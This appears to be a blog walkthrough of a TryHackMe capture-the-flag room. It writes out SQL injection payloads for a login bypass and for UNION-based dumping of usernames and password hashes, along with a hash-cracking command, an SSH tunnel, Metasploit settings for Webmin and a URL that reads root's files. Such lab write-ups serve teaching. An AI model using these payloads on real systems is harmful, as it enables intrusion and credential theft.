---
layout: post
title: You're up and running!
---



This room covers SQLi, hash cracking, SSH tunnels and Metasploit. I had to find a few of my own tools along the way. It’s also worth the time to read any and all documentation you can find. 
I used Burp Suite, nano, John the Ripper, sshpass, and a couple of manual techniques to complete the room. There are links to different resources throughout. 



Task 1: 


Navigate to the web server in your browser of choice. The cartoon avatar is from the Hitman video game series. An internet search or reverse image search provides the character's name.







Task 2:
 + 

There are several ways to exploit this SQL injection. I used Burp Suite. I like to view the HTTP request when possible. If you’ve never used Burp Suite before, PortSwigger has a getting started page. John Hammond has a good video walk through too. I’m using FireFox configured to work with Burp through the FoxyProxy extension.

Open Burp Suite and navigate to the Proxy tab. Ensure Intercept is set to “on”. Switch to your web browser and submit test information into the website’s login:password fields. Burp Suite will catch the request, and we can edit the fields. 



Change the username field to ‘ or 1=1 –, and remove all information from the password field. Click the “Intercept is on” button to turn it off and send the altered request. We are now logged into the web server. 



Task 3:

The TryHackMe room uses SQLMap to gather information on the GameZone database. Learn more about SQLMap by visiting the developer’s website and GitHub. Start with Burp Suite. 

Turn Intercept on in Burp, then enter some test information in the Game Zone Portal search box. Click search and Burp will intercept the request. 

Copy the entire contents of the HTTP request, lines 1-15, and paste them into a text file. I used nano. Feel free to use your favorite text editor. Save the file.
. 
Follow the instructions that TryHackMe provides to enumerate the database using SQLMap and the text file we created. 

Here I got an error. I spent 15 minutes researching the error using Google, Stack Overflow, and several forums. I tried again to catch the request in Burp Suite, save the information to a new text file, and run the SQLMap scan again. I couldn’t get it working so I resorted to manual SQLi. 
Type commands directly into the search box. For SQL databases, use INFORMATION_SCHEMA to find data about the tables. PortSwigger has a good tutorial (with hands-on labs) on ways to use the UNION operator in a SQLi attack.  
The command 
' UNION select 1 from information_schema.tables # 
will show either table information or an error. Increment until we receive table information: 
' UNION select 1,2 from information_schema.tables #
' UNION select 1,2,3 from information_schema.tables #


There’s information showing numbers and titles. We’re getting somewhere. 
Try searching all all table names using: 
' UNION select 1,table_schema,table_name from information_schema.tables #

Check for the name of columns within tables using: 
' UNION select 1,table_name,column_name from information_schema.columns #
There’s a lot of information to look through. Scrolling down, we find two entries in the users table labeled ‘username’ and ‘pwd’. 

Narrow the search to information from username and pwd. 
' UNION select 1,username,pwd from users# 
There are the username and password hash for our friend Agent 47.






Task 4: 
Note: The IP addresses in the screenshots change here. I stopped and came back to finish the room the next day. 


Use John the Ripper to crack the hash and learn Agent 47’s password. 
Copy the hash and paste it into a file.


Save the file and run John The Ripper. 
john hash.txt –wordlist=’/usr/share/wordlists/rockyou.txt’ –format=Raw-SHA256

Login to the machine using SSH to get the user.txt flag. If you’re new to SSH, here’s a good starter guide. 


Task 5:

Follow the TryHackMe steps to use the ss Linux command to try to login through reverse SSH. The ss command replaced netstat, if you’re familiar with netstat. You can find a primer on using the ss command here. 

Typing “ss -tulpn” shows how many TCP sockets are running.


Here I got an error. I re-tried my steps, then looked online for a possible solution. 


I didn’t find a resolution within 10-15 minutes. Let’s try a different tool. Install sshpass by typing “apt-get install sshpass”. This was my first time installing sshpass so I also read the help options by typing “sshpass -h”.
sshpass -p <PASSWORD> ssh -L 9999:localhost:10000 -l agent47 10.10.216.83

Go to “localhost:5555” in your web browser to view the hidden web portal. 

Use the user:password combination o login and get the version number. 


Task 6:
Open Metasploit by typing “msfconsole” and then “search webmin <VERSION>”

Select the fourth option by typing “use 4”.


Set some parameters and then exploit. 
SET RHOST 10.10.216.83
SET LHOST 10.10.209.97
Set USERNAME agent47
Set PASSWORD <PASSWORD>

Something failed. I tried changing parameters. 

I restarted the box but I couldn’t get it to work. 



Let’s try something different. This is a Metasploit exploit. When reviewing it on Exploit-DB I found two URLs. The PDF from AISG states we can add “/file/show.cgi” to the URL to view files on the server. 
http://localhost:5555/file/show.cgi/root/root.txt

There’s the root flag.

